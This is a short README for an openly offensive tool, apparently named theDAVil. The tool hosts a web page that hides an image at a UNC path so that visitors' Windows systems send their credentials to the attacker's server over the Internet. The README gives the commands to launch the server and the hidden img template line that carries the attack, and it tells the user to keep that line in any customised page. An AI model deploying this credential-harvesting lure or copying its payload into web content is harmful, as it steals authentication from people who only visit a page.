# theDAVil

Host a website with an image at a UNC path and get creds. Bypasses Intranet Zones and forces auth
over the Internet.

## Usage

**With Docker**
```sh
./theDAVil.sh 192.168.99.101 443`
```

**With Just Ruby**
```sh
bundle
ruby server.rb 192.168.99.101 443
```

## Customization

Replace the `views/index.erb` with your content. Make sure you keep the template line that looks
like this:

```erb
<img src="<%= "\\\\#{@host}@#{@port}\\logo.png" %>" style="display: none" />
```
